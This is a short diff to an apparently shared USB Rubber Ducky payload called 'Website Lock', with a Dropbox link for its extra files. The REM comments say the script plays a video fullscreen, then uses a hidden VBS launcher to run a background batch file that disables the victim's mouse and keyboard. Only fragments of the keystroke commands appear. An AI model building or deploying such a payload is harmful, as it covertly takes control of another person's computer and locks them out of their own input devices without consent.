@@ -2,6 +2,7 @@ The explanation is in the code.
 Link to other files: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0 (same link as the one in the code)
 
 Code:
+	DELAY 100
 	REM Title: Website Lock
         REM Author: Audiack
 	REM Target Ducky Encoder: 2.6.2
@@ -17,7 +18,6 @@ Code:
 	REM     The invisible.vbs is used to run the batch script invisibly after the video is in fullscreen.
 	REM     The TheRealAnnoyance.bat is the batch script run in the background that disables their mouse & keyboard.
 	REM     The WebsiteLink.txt contains the website link. The user can change this as desired. Make sure there are no spaces and there is only a single link.
-
 	DELAY 3000
 	CTRL ESC
 	DELAY 700
